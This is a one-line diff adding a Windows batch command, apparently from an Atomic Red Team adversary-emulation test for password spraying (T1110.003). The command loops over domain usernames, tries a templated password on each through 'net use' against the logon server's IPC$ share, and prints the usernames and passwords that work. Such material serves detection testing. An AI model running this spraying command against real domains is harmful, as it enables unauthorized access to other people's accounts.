@@ -1,0 +1,1 @@
+if not exist %temp%\users.txt  ( call ) ELSE ( "PathToAtomicsFolder\T1110.003\src\parse_net_users.bat" ) &&   &&  @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
